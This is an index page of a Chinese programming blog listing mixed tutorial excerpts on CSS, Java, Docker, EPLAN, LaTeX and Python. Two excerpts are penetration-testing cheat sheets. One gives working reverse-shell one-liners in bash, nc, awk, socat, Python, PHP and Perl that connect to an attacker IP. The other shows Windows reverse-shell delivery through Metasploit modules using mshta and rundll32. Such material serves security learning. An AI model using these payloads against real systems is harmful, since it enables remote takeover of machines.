<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程中国的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程中国的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/378b9128975fc96859508a6d2ee476bc/" rel="bookmark">
			absolute定位css元素居中的两种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1（上下左右居中，不能微调） position:absolute;
left:0; right:0; top:0; bottom:0;
margin:auto;
2（上下左右居中，可微调） position:absolute; top:50%; left:50%; margin-top:-100px;(元素高度的一半) margin-left:-100px;(元素宽度的一半) 3 横向居中 position:absolute; left:calc(50% - 元素宽度一半); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7228413f36fd3521012446ef95c44999/" rel="bookmark">
			windows 反弹shell_反弹shell的各种姿势
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来自公众号：Bypass 在渗透过程中，往往因为端口限制而无法直连目标机器，此时需要通过反弹shell来获取一个交互式shell，以便继续深入。
反弹shell是打开内网通道的第一步，也是权限提升过程中至关重要的一步。本文所有姿势整理自网络，并基于同一个假设的前提下完成测试和验证。(假设：攻击者主机为：192.168.99.242，本地监听1234端口，如有特殊情况以下会备注说明。)
Linux 反弹shell
姿势一：bash反弹
bash -i &gt;&amp; /dev/tcp/192.168.99.242/1234 0&gt;&amp;1base64版：bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4Ljk5LjI0Mi8xMjM0IDA+JjE=}|{base64,-d}|{bash,-i}'在线编码地址：http://www.jackson-t.ca/runtime-exec-payloads.html 其他版本：
exec 5&lt;&gt;/dev/tcp/192.168.99.242/1234;cat &amp;5 &gt;&amp;5;doneexec /bin/sh 0&amp;0 2&gt;&amp;0 姿势二：nc反弹
nc -e /bin/bash 192.168.99.242 1234 姿势三：awk反弹
awk 'BEGIN{s="/inet/tcp/0/192.168.99.242/1234";for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)}' 姿势四：telnet反弹
备注：需要在攻击主机上分别监听1234和4321端口，执行反弹shell命令后，在1234终端输入命令，4321查看命令执行后的结果。
telnet 192.168.99.242 1234 | /bin/bash | telnet 192.168.99.242 4321 姿势五：socat反弹
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.99.242:1234 姿势六：Python反弹
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.99.242',1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);" 姿势七：PHP反弹
php -r '$sock=fsockopen("192.168.99.242",1234);exec("/bin/sh -i &amp;3 2&gt;&amp;3");' 姿势八：Perl反弹
perl -e 'use Socket;$i="192.168.99.242";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};' 姿势九：Ruby反弹
ruby -rsocket -e'f=TCPSocket.open("192.168.99.242",1234).to_i;exec sprintf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7228413f36fd3521012446ef95c44999/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c098e9629919253461cbe0dfd6be5da6/" rel="bookmark">
			netty&#43;动态代理项目（2）：客户端发送消息并同步获取结果
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题二：客户端发送完参数（接口名，参数，service名）后，服务端处理完数据在客户端的handler接收，而不是客户端发送消息并同步获取结果
原有关代码 为什么不直接发序列化后的json字符串，而是发送一个ByteBuf类型的数据，是因为直接发送，无法控制粘包分包的问题，在服务端加入长度解码器LengthFieldBasedFrameDecoder（），完美控制连续发送时的粘包问题。
@Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { //jsonString是我在这处理好的一个String序列化后的json数据，代码太臭长，就不漏出来了。 //影响观赏 byte[] bytes = jsonString.getBytes("UTF-8"); ByteBuf buf = Unpooled.buffer(); buf.writeChar(100); buf.writeInt(bytes.length+4); buf.writeBytes(bytes); future.channel().writeAndFlush(buf);//客户端发送消息给客户端语句 Object object = null; return object; } 下面是客户端接收处理后数据的类，只要处理完会自动进到这来（当然是在一直连接的前提下）
msg就是数据
public class ClientHandler extends ChannelInboundHandlerAdapter { @Override public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception { String message = msg.toString(); if (message != null) { Object data = JSONObject.parseObject(message, Object.class); } } } 修改后代码 public class ClientHandler extends ChannelInboundHandlerAdapter { private static Logger logger = Logger.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c098e9629919253461cbe0dfd6be5da6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fcac5e0924bfa9cafebe6f328e48918b/" rel="bookmark">
			华为网络设备交换机路由器查看日志命令方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 描述：华为网络设备交换机路由器查看日志命令方法
命令：
display logbuffer 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cf0e46c0ff1f1c0d79ee00529042e2e/" rel="bookmark">
			node各种版本
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		低/历史版本下载地址： https://nodejs.org/zh-cn/download/releases/
高版本下载地址：https://nodejs.org/zh-cn/download/
安装出现：a later version of node.js
之前安装过，没卸载干净。
删除以下
C:\Program Files (x86)\Nodejs
C:\Program Files\Nodejs
C:\Users{User}\AppData\Roaming\npm（或%appdata%\npm）
C:\Users{User}\AppData\Roaming\npm-cache（或%appdata%\npm-cache）
删除之后配置环境变量的就删除环境变量
然后找到
C:\ProgramData\Microsoft\Windows\Start Menu
路径下的卸载
卸载成功再安装
我下载的10版本的
下载 msi的 直接下一步安装就可以了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f46cac1a2f57caac8eb67d4c5e48be64/" rel="bookmark">
			js 获取map的所有key_map的四种遍历方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Map四种遍历的代码示例
(1)数据准备
HashMap&lt;String, String&gt; map = new HashMap&lt;String,String&gt;();
map.put("1","DrDeng1");
map.put("2","DrDeng2");
map.put("3","DrDeng3");
遍历方式一:需要说明的是，该方法不是最优选择，一般不推荐使用
System.out.println("通过map.keyset进行遍历key和value");
for (String key:map.keySet()){
System.out.println("key= "+key+" and value= "+map.get(key));
}
遍历方式二:通过对map entrySet的遍历，也可以同时拿到key和value，一般情况下，性能上要优于keyset,这一种也是最常用的遍历方法,但Iterator也有其优势：在用foreach遍历map时，如果改变其大小，会报错，但如果只是删除元素，可以使用Iterator的remove方法删除元素
System.out.println("通过Map.entrySet;")
Set&lt;Map.Entry&lt;String, String&gt;&gt; entries = map.entrySet();
for (Map.Entry&lt;String, String&gt;entry:entries){
String value = entry.getValue();
String key = entry.getKey();
System.out.println("key="+key+"value="+value);
}
遍历方式三:对于上面的几种foreach都可以用Iterator代替，其实foreach在java5中才被支持，foreach的写法看起来更简洁
System.out.println("通过iterator遍历所有的value,但是不能遍历key");
Iterator&lt;Map.Entry&lt;String, String&gt;&gt; iterator = map.entrySet().iterator();
while (iterator.hasNext()){
Map.Entry&lt;String, String&gt; next = iterator.next();
System.out.println("key="+next.getKey()+"value="+next.getValue());
}
遍历方式四:
System.out.println("通过map.values()遍历所有的key,但是不能遍历key");
for (String v:map.values()){
System.out.println("value="+v);
}
结论1:
一般来讲使用entrySet的方式进行遍历是效率最高的，因为hashMap内部的存储结构就是基于Entry的数组，在用这种方式进行遍历时，只需要遍历一次即可。而使用其他方式的时间复杂度可以会提高，例如：keySet方式，每次都需要通过key值去计算对应的hash,然后再通过hash获取对应的结果值，因此效率较低。
结论2:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f46cac1a2f57caac8eb67d4c5e48be64/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/130ffb72cf3abf11b1e49a608fdfd630/" rel="bookmark">
			docker网络问题解决办法“大全”：关于宿主机访问不了docker容器中web服务，或者容器内访问不了外网的问题的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 docker网络问题解决办法“大全”：关于宿主机访问不了docker容器中web服务，或者容器内访问不了外网的问题的解决办法
参考文章：
（1）docker网络问题解决办法“大全”：关于宿主机访问不了docker容器中web服务，或者容器内访问不了外网的问题的解决办法
（2）https://www.cnblogs.com/ldw85/p/5218766.html
备忘一下。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ac4fa929a77833eae76f0646d1026d2/" rel="bookmark">
			idea tomcat热部署_IDEA--在IDEA中实现热部署SpringBoot项目
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、开启IDEA的自动编译(静态)
具体步骤：打开顶部工具栏 File -&gt; Settings -&gt; Default Settings -&gt; Build -&gt; Compiler 然后勾选 Build project automatically
二、开启IDEA的自动编译(动态)
具体步骤：同时按住 Ctrl + Shift + Alt + / 然后进入Registry ，勾选自动编译并调整延时参数。
compiler.automake.allow.when.app.running -&gt; 自动编译compile.document.save.trigger.delay -&gt; 自动更新文件 compile.document.save.trigger.delay 它主要是针对静态文件如JS CSS的更新，将延迟时间减少后，直接按F5刷新页面就能看到效果！
三、开启IDEA的热部署策略(非常重要)
具体步骤：顶部菜单- &gt;Edit Configurations-&gt;SpringBoot插件-&gt;目标项目-&gt;勾选热更新。
四、在POM文件添加热部署插件(可选)
org.springframework.boot spring-boot-devtools runtime 五、关闭浏览器缓存(重要)
打开谷歌浏览器，打开F12的Network选项栏，然后勾选【✅】Disable cache 。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1031a4543d1664a30e60ba894fbf7291/" rel="bookmark">
			请确定指定的驱动器中是否有盘_Win10下为可移动磁盘分配固定的驱动器号（盘符）...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 每当我们把U盘/移动硬盘/读卡器等可移动磁盘插入Windows电脑时，系统都会自动为它分配一个盘符(驱动器号)。如果你经常使用多个可移动磁盘，那么每次分配的盘符可能就会都不一样，这在你经常运行带文件路径的命令时就需要频繁修改路径中的盘符，很是麻烦。下面MS酋长就来分享一下在Windows10中如何为可移动磁盘分配固定的盘符(驱动器号)： 首先，把想要分配固定驱动器号的可移动磁盘都插到电脑上。 方法一：在《磁盘管理》中分配驱动器号 右键点击Win10开始按钮，在弹出的系统快捷菜单中选择“磁盘管理”，打开“磁盘管理”工具，在想要分配固定盘符的可移动磁盘上点击右键，选择“更改驱动器号和路径”。 这时就会打开更改窗口。如图： 点击“更改”按钮，在弹出的窗口中“分配以下驱动器号”右侧的下拉列表中选择你想要的驱动器号(例如 T )，确定。 PS: 建议你尽量分配一个靠后的盘符，这样才能避免先插入其他可移动磁盘时，该盘符被“抢走”的风险。因为这个“固定”其实是相对的，只有在不被提前占用的情况下，才会固定分配该盘符。 这样该可移动磁盘就被分配了固定的盘符 T 。以后你再在这台电脑上插入这个可移动磁盘时，就会被分配该盘符(被占用除外)。 方法二：diskpart命令分配驱动器号 以管理员身份运行命令提示符，依次输入并回车运行以下命令： diskpart - 运行diskpart磁盘管理工具list volume - 列出所有可用卷select volume 11 - 选择想要分配驱动器号的卷assign letter=T - 为该卷分配驱动器号 T 方法三：Windows PowerShell分配驱动器号 以管理员身份运行Windows PowerShell，依次输入并回车运行以下命令： Get-Disk - 列出可用磁盘Get-Partition -DiskNumber 3 | Set-Partition -NewDriveLetter T - 为指定磁盘分配驱动器号 T 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/615ed85ba7db4f7ecad8001887342b50/" rel="bookmark">
			使用 biblatex 进行参考文献管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原 文：Bibliography management with natbib
译 者：Xovee
翻译时间：2020年11月21日
使用 biblatex 进行参考文献管理 当你使用 LaTeX 进行参考文献管理时，一般来说你有三种选择：bibtex、natbib、biblatex。Biblatex是一个非常现代化的处理参考文献信息的程序，它提供了简单、灵活、易于操作的界面，在语言支持上也比其他两个工具更好。本篇文章介绍如何使用biblatex来在 LaTeX 文档中进行参考文献管理。
文章目录 使用 biblatex 进行参考文献管理介绍基础用法参考文献文件自定义参考文献在目录中添加参考文献章参考指南延伸阅读 介绍 下面介绍了一个简单的例子：
\documentclass{article} \usepackage[utf8]{inputenc} \usepackage[english]{babel} \usepackage{biblatex} \addbibresource{sample.bib} \begin{document} Let's cite! The Einstein's journal paper \cite{einstein} and the Dirac's book \cite{dirac} are physics related items. \printbibliography \end{document} 这个例子中介绍了四种与参考文献有关的命令：
\usepackage{biblatex}
引入biblatex包
\addbibresource{sample.bib}
从sample.bib文件中引入bibtex数据。这个文件中包含了你所需要的各种参考文献的信息。
\cite{einstein}
这个命令会在文档中插入一个参考文献，在这个例子中，它会在文档中显示 [1]，einstein是该参考文献在文件中某个条目的关键字。
\printbibliography
打印所有引用的参考文献，其默认的标题为Reference（article类型的文档），或者Bibliography（books或reports类型的文档）。
Overleaf 提供了许多预定义的参考文献管理格式。
基础用法 在引入包的时候，你可以传递许多参数，例如：
\documentclass{article} \usepackage[utf8]{inputenc} \usepackage[english]{babel} \usepackage{comment} \usepackage[ backend=biber, style=alphabetic, sorting=ynt ]{biblatex} \addbibresource{sample.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/615ed85ba7db4f7ecad8001887342b50/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2453f0c1b833ae3eb047a6259cfa202/" rel="bookmark">
			eplan连接定义点不显示_EPLAN操作命令之线色设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EPLAN操作命令之线色设置 今天我们利用操作命令建立一个快速改变线色的小工具栏，希望以此来扣开EPLAN操作命令的大门。EPLAN中连线默认的颜色是红色的，改变它的颜色需要在连接定义点中连接图形的颜色进行设置。这样操作步骤还是挺多的，而使用我们的快速改变线色小工具栏，一框选再点击就OK了。
具体步骤：
工具栏空白处右键&gt;调整
点击"新建"建立一个新的工具栏，工具栏名称：戴帽子的五花肉_1，确定后EPLAN窗口里会生成一个空白的工具栏，用来放置拖拽过来的各种功能的按钮。
点击命令选项卡，找到操作命令，右侧的按钮中会有一些系统自带的操作命令，比如"插入设备"就是插入部件的功能，它的命令行是：XDLInsertDeviceAction /PartNr:? /PartVariant:1(具体的命令行可以到EPLAN的帮助文件中去寻找，这些命令都是EPLAN固化好的)
这里我们随便拖拽一个按钮命令到之前生成的空白工具栏进入到设置按钮窗口
图片文件：工具栏中按钮的图标
工具条提示：鼠标悬停工具栏中按钮时显示的提示文字
命令行：要实现功能的操作命令
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/70c30567bec194a6e568b03cba856426/" rel="bookmark">
			eplan连接定义点不显示_怎么才能在EPLAN上出现断点后，使导线颜色连续？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EPLAN 其实是一个很不错的电气绘图软件，它和CAD大相径庭，让人值得一提的是：EPLAN的耗费内存非常小，安装包只有1个多G，和CAD庞大的体积比较，EPLAN可真是电气人员的标配。
而且内存小的优点能给电脑减轻压力，要知道，当今西门子的TIA软件最新版V15的安装包已经大达30+个G 了，如果再有其他一些软件，感觉自己的电脑会卡死在路上吧！还没开始工作已经暴跳如雷了！
最近刚开始用EPLAN，发现EPLAN一个功能简直有用，就想着给大家分享一下，这个好用的功能就是：不同的导线可以设置成不同的颜色。
图一
如图一所示，把三相交流电设置为不同的颜色，这样做不仅便于观看分辨，而且整个图纸也比较漂亮，还可以打印成PDF文档，无论印成图纸还是在电脑上观看，一目了然，非常便利。
后来研究了一下这个的实现原理，其实是利用EPLAN 中的电位定义点功能，定义四个电位点 L1、L2、L3、N，分别设置不同的颜色，但是，它也会出现一个普遍的问题，想必很多人也都遇到过，那就是出现断点后，颜色就不连续的问题。
图二
如图二所示，增加一个断路器后，看右边荧光笔表示的部分，即使线路是相连的，但是更新后，颜色还是没有改变，问了度娘后，网友们都觉得是断路器让线路断开了，EPLAN软件自身判断为不连续了，解决方法也是花样多多，但感觉很多也没命中问题的本质。
个人认为，原因是：电路没有形成回路，也就是右边的导线是悬空的，上面只有电压，没有形成电流，因此EPLAN判定为无效的，所以就没有改变颜色。
图三
大家看图三，右边只是EPLAN中几个连接符号，没有任何元件，所以，这段线路是无效的，解决的方案就是让线路形成回路，或是加上元器件，在这里，我们加上端子
图四
如图四所示，加上端子，EPLAN就认为这是一段有效电路，就可以了。所以，多次试验认为，只有有效电路，利用电位定义点改变颜色才会有效，否则，导线还是原来的颜色。
图五
如图五所示，这个指示灯并没有形成回路，所以连接零线的导线还是红色的。
所以，EPLAN是非常智能的软件，按照有些人的说法，导线是有灵魂的，必须形成回路才有效。以上一个EPLAN新手研究这几天得出的结论，如有不足，望各位高手批评指正。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7e0ee9ed7e590d1b92cb352aec1cf006/" rel="bookmark">
			eplan连接定义点不显示_EPLAN使用多年的经验分享
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多年以前接触EPLAN，此后弃用ACAD制图，机电专业也自此彻底转为电气专业，而制图的观念却用了很久才转变过来。
EPLAN是直接面向对象的操作软件，很多初学的电气设计人员的画图步骤也许是：先找到符号——插入——绘制原理图——逐一选择适当的部件，殊不知这样的操作完全违反了EPLAN面向对象的设计机制，也多了很多繁琐的工作。比如，在图中先插入一个继电器符号，命名为KA1
然后，打开设备导航器，此时发现KA1下面只有一个线圈，没有触点，这是因为没有为KA1指定部件：
如果我们再在原理图中插入KA1的触点，需要把默认的符号名-?K1改为-KA1，最终才确定部件。
而熟练的工程师则可以这样操作，设计之前，对部件的运用已经全面掌握，那么在制图的时候就直接插入部件即可，只需一步到位：
插入设备(ALT+Insert)，
选择施耐德LC1D09接触器，确定，则自动创建了一个线圈，还有部件可以使用的触点，这里先不插入触点。可以看到改部件下，可以使用的触点。
如果需要使用哪一组触点，直接点击触点即可放置到原理图中去，这样有哪些触点可以使用就一目了然了。
当然，前提是，建立好一个“属于自己”的部件库，我的部件库是这样的：
二、对于宏的操作，对于某些控制回路，做成宏之后调用能起到事半功倍的效果，如起保停电路，自动往返电路，等。画好一次后，全选创建窗口宏，以后即可反复调用。
值集宏，对于值集宏，我的理解是，带有数值的集合的宏，比如我们可以创建一个三相电机运行的主电路，它们可以分为，保护器、接触器、热继电器、端子、电机等，每一个部件都有各自的部件值可以选择，那么把它们集合起来，就叫值集宏吧。具体步骤为
1.先画好电路，选择后，插入占位符对象
2.填写占位符对象值，点击数值页面，填入新值集和新变量，名称。然后在分配选项卡中，选择对应符号的变量。如下图所示：
3.填好后，确定，就有了一个占位符符号：
4.全选，连占位符一起选，创建窗口宏。好了，值集宏就做好了，下一步，调用。
点击窗口宏，选择刚才创建的宏，插入。这时出现一个选择窗口，我们对应电机选择即可。这样就会自动填上我们值集宏里做好的数值。
三.端子的创建，很多设计人员认为端子可以不在原理图中表现，或者只要随便画个端子表格就可以了，而细心的德国人可不会这样想哦，他们把端子分的很细，细到连端子附件都要一一列出来，每一个端子对应哪一个连接点，必须严格按图纸要求施工。
对此，我对端子的快速操作也有一点了解，首先要对端子排定义，然后新建端子设备，可以这样快速建立N个端子并确定部件。
这样就创建了100个PXC部件，需要哪个就直接在导航器中拖选，是不是非常方便呢？
四.说到导航器，不得不说下导航器的功能，在画图的时候，一定要打开导航器，包括了设备导航器，端子排导航器，插头导航器，PLC导航器......使用导航器操作，其中的便捷，谁用谁知道！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/60cf225c9b9293f6f52dc092371801d2/" rel="bookmark">
			python中怎么打开文件_python中的文件打开与关闭操作命令介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.文件打开与关闭
在python，使用open函数，可以打开一个已经存在的文件，或者创建一个新文件
open(文件名，访问模式)。
f = open('test.txt', 'w')
文件打开模式：
访问模式
说明
r
以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。
w
打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
a
打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。
rb
以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。
wb
以二进制格式打开一个文件只用于写入。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
ab
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。
r+
打开一个文件用于读写。文件指针将会放在文件的开头。
w+
打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
a+
打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。
rb+
以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。
wb+
以二进制格式打开一个文件用于读写。如果该文件已存在则将其覆盖。如果该文件不存在，创建新文件。
ab+
以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。
注：写打开文件的同时马上写上关闭文件
# 新建一个文件，文件名为:test.txt
f = open('test.txt', 'w')
# 关闭这个文件
f.close()
以上这篇python中的文件打开与关闭操作命令介绍就是小编分享给大家的全部内容了，希望能给大家一个参考，也希望大家多多支持脚本之家。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/178eaefd5805cd3ea3974680867208e4/" rel="bookmark">
			smartpdf双击无法返回latex如何解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		smartpdf双击无法返回latex解决办法 ##原因一
当你的smartpdf双击无法返回latex代码时，是因为你的winedit 状态栏的 --src 点消失了，找到状态栏 Tex:UTF-8 与 WinEdit.prj, 然后在中间点一下，使 --src 出现即可；也可以鼠标右击状态栏，勾选 Show Custom Info, Show Custom Info A, Show Custom Info B.
##原因二
可能你的文档含有中文或者空格或者特殊字符，全都改成英文名字就可以啦。
今天就记录这么多。遇到问题继续记录。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a7d4047844738e4bfbb702cee790247/" rel="bookmark">
			windows 反弹shell_原创干货 | windows反弹shell小结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 本文是att&amp;ck Command-Line Interface的展开篇
平时遇到rce的漏洞，我们通常会弹一个shell给自己，(提权，内网渗透，搭建跳板，等等)linux反弹shell得益于命令行特别友好，所以我们可以非常简单地就可以把shell弹出来，比如使用bash，perl，python，nc，获得shell的原理其实就是建立了一个socket通道，那么今天我们来看看windows如何反弹shell
目录 Mshta.exe
通过Metasploit的HTAWeb服务器发起HTA攻击
rundll32.exe
通过SMB交付Metasploit发起Rundll32攻击
Regsvr32.exe
通过Metasploit的脚本Web交付启动Regsvr32
Certutil.exe
通过MsfvenomC＃shellcode启动MSbuild攻击
Powershell.exe
通过Powershell发起Powercat攻击
通过Powershell启动cscript.exe
通过Powershell发起批处理文件攻击
Msiexec.exe
通过msfvenom发动msiexec攻击
Wmic.exe
通过Koadic发起Wmic.exe攻击
Mshta.exe Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。
Metasploit包含“HTAWeb服务器”模块，该模块会生成恶意的hta文件。该模块托管一个HTML应用程序(HTA)，该应用程序在打开时将通过Powershell运行有效负载。当用户导航到HTA文件时，将在执行有效负载之前由IE两次提示它们。
use exploit/windows/misc/hta_servermsf exploit(windows/misc/hta_server) &gt; set srvhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; set lhost 192.168.1.109msf exploit(windows/misc/hta_server) &gt; exploit 现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。
rundll32.exe Rundll32.exe与Windows操作系统相关联，可让您调用从DLL(16位或32位)导出的函数并将其存储在适当的内存库中。
通过SMB交付Metasploit发起Rundll32攻击
Metasploit还包含“SMBDelivery”模块，该模块生成恶意的dll文件。该模块通过SMB服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持DLL和Powershell。
use exploit/windows/smb/smb_deliverymsf exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.1.109msf exploit(windows/smb/smb_delivery) &gt; exploit 现在，通过受害机器(对RCE易受攻击)上的rundll32.exe运行恶意代码，以获取Meterpreter会话。
经过测试只能支持smb1协议机器才行
Regsvr32.exe Regsvr32是一个命令行实用程序，用于注册和注销OLE控件，例如Windows注册表中的DLL和ActiveX控件。WindowsXP和更高版本的Windows的％systemroot％\System32文件夹中安装了Regsvr32.exe。
RegSvr32.exe具有以下命令行选项：
语法：Regsvr32/s/n]
/ u –注销服务器
/ i –调用DllInstall，并为其传递可选的[cmdline]；与/u一起使用时，它将调用dll来卸载
/ n –不要调用DllRegisterServer；此选项必须与/i
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a7d4047844738e4bfbb702cee790247/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8c96f6823d950cf55e48ab921e8e2ce7/" rel="bookmark">
			opencv 使用java  mat 转 base64 两种方式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mat先转文件再转Base64 private static String ImageToBase64(String imgPath) { byte[] data = null; // 读取图片字节数组 try { InputStream in = new FileInputStream(imgPath); data = new byte[in.available()]; in.read(data); in.close(); } catch (IOException e) { e.printStackTrace(); } // 对字节数组Base64编码 BASE64Encoder encoder = new BASE64Encoder(); String base64Ret = encoder.encode(Objects.requireNonNull(data)); // 返回Base64编码过的字节数组字符串 System.out.println("本地图片转换Base64:" + ret); return base64Ret; } private static String MatToBase64(Mat capImg){ Imgcodecs.imwrite(tmpFilePath + "tmp.jpg", capImg); String base64 = ImageToBase64(tmpFilePath + "tmp.jpg"); } Mat直接转Base64 private String MatToBase64(Mat capImg){ String jpg_base64 = null; Imgcodecs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8c96f6823d950cf55e48ab921e8e2ce7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52d01bc154b32b70877e65065d1b9b88/" rel="bookmark">
			docker启动命令_dockers常用的基本命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、启动或停止docker命令
sudo service docker start 启动docker centos6.x的命令sudo service docker restart 重启docker centos6.x的命令sudo service docker stop 关闭docker centos6.x的命令sudo systemctl start docker 启动docker centos7.x 命令sudo systemctl restart docker 重启docker centos7.x 命令sudo systemctl stop docker 关闭docker centos7.x 命令 2、查看docker版本
docker -v 3、查看docker下载的镜像
sudo docker images 4、設置docker开机自启动
sudo systemctl enable docker 5、查看容器启动日志
①、docker logs -f -t --tail 10 smartbus #实时查看docker容器名为smartbus的最后10行日志②、docker logs -f -t --since="2020-08-06" --tail=100 smartbus #查看指定时间后的日志，只显示最后100行③、docker logs --since 30m smartbus #查看最近30分钟的日志④、docker logs -t --since="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/52d01bc154b32b70877e65065d1b9b88/">Read more…</a>
